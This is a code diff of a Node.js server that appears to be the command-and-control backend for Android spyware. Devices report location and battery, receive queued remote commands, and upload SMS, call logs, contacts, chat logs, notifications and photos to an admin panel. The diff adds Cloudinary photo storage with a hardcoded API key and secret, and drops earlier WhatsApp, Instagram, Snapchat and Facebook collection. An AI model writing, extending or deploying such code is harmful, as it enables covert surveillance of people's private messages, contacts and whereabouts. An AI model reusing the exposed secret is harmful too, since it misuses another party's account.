@@ -3,11 +3,19 @@ const fs = require('fs');
 const path = require('path');
 const cors = require('cors');
 const bodyParser = require('body-parser');
+const cloudinary = require('cloudinary').v2; // ADDED: Cloudinary Import
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// --- 1. SETUP & STORAGE ---
+// --- 1. CLOUDINARY CONFIG (Tumhari Details) ---
+cloudinary.config({
+  cloud_name: 'dxnh5vuik',
+  api_key: '185953318184881',
+  api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
+});
+
+// --- 2. SETUP & MIDDLEWARE ---
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
@@ -21,7 +29,75 @@ app.use(express.static(__dirname));
 // In-Memory Storage for Live Status
 let devicesStatus = {}; 
 
-// --- 2. ADMIN DASHBOARD ROUTES ---
+// ==================================================
+//  NEW GALLERY SYSTEM (CLOUDINARY) - START
+// ==================================================
+
+// A. PHOTO UPLOAD ROUTE (Android se aayega)
+app.post('/api/upload-image', (req, res) => {
+    // Android "image_data" (Base64) aur "device_id" bhejega
+    let { device_id, image_data } = req.body;
+
+    if (!device_id || !image_data) {
+        return res.status(400).json({ error: "No Data Received" });
+    }
+
+    const id = device_id.toString().trim().toUpperCase();
+
+    // Cloudinary pe upload (Ram se seedha Cloud)
+    cloudinary.uploader.upload("data:image/jpeg;base64," + image_data, 
+        { 
+            folder: id, // Device ID ka Folder banega
+            public_id: Date.now().toString(), // File name = Time
+            width: 800, // Thoda compress (Resize)
+            crop: "limit"
+        },
+        function(error, result) {
+            if (error) {
+                console.error("❌ Cloudinary Error:", error);
+                return res.status(500).json({ error: "Upload Failed" });
+            }
+            console.log(`📸 [GALLERY] New Photo Uploaded for ${id}`);
+            res.json({ status: "success", url: result.secure_url });
+        }
+    );
+});
+
+// B. GALLERY LIST ROUTE (Website "Load More" ke liye use karegi)
+app.get('/api/gallery-list/:device_id', (req, res) => {
+    const id = req.params.device_id.toUpperCase();
+    const next_cursor = req.query.next_cursor || null; // Load More token
+
+    // Cloudinary se list maango
+    cloudinary.api.resources({
+        type: 'upload',
+        prefix: id + "/", // Folder name match karo
+        max_results: 5,   // Ek baar mein 5 photos
+        next_cursor: next_cursor, 
+        context: true
+    }, 
+    function(error, result) {
+        if (error) {
+            // Agar folder nahi mila (Matlab koi photo nahi hai abhi)
+            return res.json({ photos: [], next_cursor: null });
+        }
+
+        // Sirf URL bhejo website ko
+        const photos = result.resources.map(img => img.secure_url);
+        
+        res.json({ 
+            photos: photos, 
+            next_cursor: result.next_cursor // Agle page ka token
+        });
+    });
+});
+
+// ==================================================
+//  NEW GALLERY SYSTEM - END
+// ==================================================
+
+
+// --- 3. ADMIN DASHBOARD ROUTES ---
 
 // Saare devices ki list mangne ke liye
 app.get('/api/admin/all-devices', (req, res) => {
@@ -40,8 +116,7 @@ app.get('/api/device-status/:id', (req, res) => {
     res.json({ ...device, isOnline: isOnline });
 });
 
-// --- 3. PHONE CONNECTION (PING) ---
-// Phone har 4 second me yahan hit karega
+// --- 4. PHONE CONNECTION (PING) ---
 app.post('/api/status', (req, res) => {
     try {
         let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
@@ -50,15 +125,12 @@ app.post('/api/status', (req, res) => {
 
         const id = device_id.toString().trim().toUpperCase();
         
-        // --- COMMAND HANDLING (Brightness/Volume logic yahan hai) ---
+        // --- COMMAND HANDLING ---
         let pendingCommand = "none";
         
-        // Agar admin ne koi command set kiya hai (jaise "brightness:50")
         if (devicesStatus[id] && devicesStatus[id].command) {
             pendingCommand = devicesStatus[id].command;
-            
-            // Command bhejte hi server se clear kar do taaki repeat na ho
-            devicesStatus[id].command = "none";
+            devicesStatus[id].command = "none"; // Clear after sending
         }
 
         let finalBattery = battery || level || 0;
@@ -66,9 +138,9 @@ app.post('/api/status', (req, res) => {
         let currentLat = lat || (devicesStatus[id] ? devicesStatus[id].lat : 0);
         let currentLon = lon || (devicesStatus[id] ? devicesStatus[id].lon : 0);
 
-        // Status Update Memory me
+        // Status Update
         devicesStatus[id] = {
-            ...devicesStatus[id], // Purana data preserve karo
+            ...devicesStatus[id], 
             id: id,
             model: model || (devicesStatus[id] ? devicesStatus[id].model : "Unknown"),
             battery: finalBattery,
@@ -77,16 +149,13 @@ app.post('/api/status', (req, res) => {
             lat: currentLat,
             lon: currentLon,
             lastSeen: Date.now(),
-            // Command overwrite mat karna yahan, upar handle ho gaya
             command: devicesStatus[id] ? devicesStatus[id].command : "none" 
         };
 
-        // Server logs me dikhega ki command gaya ya nahi
         if(pendingCommand !== "none") {
-            console.log(`📡 [PING] ${id} ko Command diya gaya: ${pendingCommand}`);
+            console.log(`📡 [PING] ${id} Command Sent: ${pendingCommand}`);
         }
 
-        // Phone ko command wapas bhejo
         res.json({ status: "success", command: pendingCommand });
 
     } catch (e) {
@@ -95,9 +164,8 @@ app.post('/api/status', (req, res) => {
     }
 });
 
-// --- 4. COMMAND SENDING (Admin Panel se) ---
+// --- 5. COMMAND SENDING ---
 app.post('/api/send-command', (req, res) => {
-    // Admin panel se aayega: { device_id: "123", command: "brightness:50" }
     let { device_id, command } = req.body;
     
     if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
@@ -108,23 +176,20 @@ app.post('/api/send-command', (req, res) => {
         devicesStatus[id] = { id: id, lastSeen: 0 };
     }
     
-    // Command Store karo (Next Ping pe phone le jayega)
     devicesStatus[id].command = command;
-    
     console.log(`🚀 [ADMIN] Sending Command '${command}' to Device ${id}`);
     
     res.json({ status: "success", command: command });
 });
 
-// --- 5. DATA UPLOAD (Logs, Contacts, SMS, Social Media) ---
+// --- 6. DATA UPLOAD (Logs, Contacts, SMS, Location) ---
+// Note: Ye data abhi bhi JSON files me save hoga (Ephemeral)
 app.post('/api/upload_data', (req, res) => {
     let { device_id, type, data } = req.body;
     
     if (!device_id) return res.status(400).json({ error: "No ID" });
     
     const id = device_id.toString().trim().toUpperCase();
-    
-    // File ka naam: uploads/123456_sms.json
     const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
 
     try {
@@ -134,40 +199,27 @@ app.post('/api/upload_data', (req, res) => {
         if (type === 'location') {
             const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
             
-            // Dashboard map ke liye update
             if (locObj && (locObj.lat || locObj.latitude)) {
                 if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                 devicesStatus[id].lat = locObj.lat || locObj.latitude;
                 devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
             }
-            
-            // Location file me overwrite karo (history chahiye to append logic lagana)
             fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
             console.log(`📍 [LOCATION] Updated for ${id}`);
         }
         
-        // --- B. LIST DATA (WhatsApp, SMS, Logs etc.) ---
-        else if ([
-            'notifications', 'sms', 'call_logs', 'contacts', 'chat_logs', 
-            'whatsapp', 'instagram', 'snapchat', 'facebook', 'social_media'
-        ].includes(type)) {
-            
+        // --- B. LIST DATA (SMS, Logs, etc.) ---
+        else if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
             let existingData = [];
-            // Agar pehle se file hai to uska data padho
             if (fs.existsSync(filePath)) {
                 try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
             }
-
             const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
-            
-            // Naya data upar (Top) pe jodo
-            const finalData = [...newDataArray, ...existingData].slice(0, 2000); // Max 2000 items
+            const finalData = [...newDataArray, ...existingData].slice(0, 2000); 
             
             fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
-            console.log(`✅ [DATA] ${type} saved for ${id} (${newDataArray.length} items)`);
+            console.log(`✅ [DATA] ${type} saved for ${id}`);
         } 
-        
-        // --- C. OTHERS (Generic) ---
         else {
             fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
         }
@@ -179,36 +231,9 @@ app.post('/api/upload_data', (req, res) => {
     }
 });
 
-// --- 6. GALLERY & GET ROUTES ---
-app.post('/api/upload_gallery', (req, res) => {
-    let { device_id, image_data, date } = req.body;
-    if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });
-    
-    const id = device_id.toString().trim().toUpperCase();
-    const filePath = path.join(UPLOADS_DIR, `${id}_gallery.json`);
-    
-    try {
-        let galleryData = [];
-        if (fs.existsSync(filePath)) { try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {} }
-        
-        galleryData.unshift({ 
-            time: date || new Date().toLocaleString(), 
-            uploadedAt: Date.now(), 
-            image: image_data 
-        });
-        
-        // Sirf last 50 photos rakho storage bachane ke liye
-        fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 50), null, 2));
-        
-        console.log(`📸 [GALLERY] Photo received from ${id}`);
-        res.json({ status: "success" });
-    } catch (error) { res.status(500).json({ error: "Failed" }); }
-});
-
-// Admin panel file dekhne ke liye yahan request karega
+// Admin panel file dekhne ke liye yahan request karega (SMS/Logs etc)
 app.get('/api/get-data/:device_id/:type', (req, res) => {
     const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
-    
     if (fs.existsSync(filePath)) {
         res.sendFile(filePath);
     } else {
